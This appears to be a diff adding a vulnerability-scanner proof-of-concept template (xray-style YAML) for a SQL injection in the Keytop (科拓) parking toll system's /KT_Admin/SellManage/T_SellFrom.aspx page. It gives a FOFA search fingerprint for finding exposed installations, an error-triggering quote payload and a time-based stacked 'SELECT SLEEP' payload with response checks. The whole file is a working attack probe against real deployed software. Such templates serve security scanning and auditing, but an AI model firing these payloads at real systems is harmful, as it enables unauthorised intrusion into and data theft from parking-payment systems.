@@ -1,0 +1,28 @@
+id: poc-yaml-keytop-toll-system-t-sellfrom-aspx-sqli
+info:
+  name: 科拓全智能停车收费系统 T_SellFrom.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科拓全智能停车收费系统
+  fofa: body="/KT_Css/qd_defaul.css"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: POST
+  path: /KT_Admin/SellManage/T_SellFrom.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: start=0&limit=20&filer=1'
+  expression: "status_code == 500 && \ncontains(body,\"SQL syntax\") &&\ncontains(body,\"\
+    MySQL server\")\n"
+- method: POST
+  path: /KT_Admin/SellManage/T_SellFrom.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: start=0&limit=20&filer=1;SELECT SLEEP({{.t1}})#
+  expression: "status_code == 200 && \ncontains(body,\"success:true\") &&\nduration\
+    \ > t2 &&\nduration < t3\n"
+transport: http
